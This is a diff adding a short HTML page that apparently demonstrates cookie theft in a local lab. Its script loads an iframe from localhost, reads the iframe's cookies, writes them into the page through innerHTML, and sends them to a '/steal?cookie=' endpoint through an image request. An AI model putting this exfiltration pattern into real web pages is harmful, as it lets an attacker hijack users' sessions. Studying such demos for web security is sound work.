@@ -1,0 +1,24 @@
+<!doctype html>
+<head>
+    <body>
+        <a href='/'>Back</a>
+        <p></p>
+        <script>
+            document.cookie = ''
+            const iframe = document.createElement('iframe')
+            iframe.src = 'http://localhost:4000/cookie'
+            document.body.appendChild(iframe)
+
+
+            setTimeout(function() {
+            const p = document.createElement('p')
+            p.innerHTML = iframe.contentDocument.cookie
+            document.body.appendChild(p)
+
+            new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
+            }, 5000);
+
+
+        </script>
+    </body>
+</head>
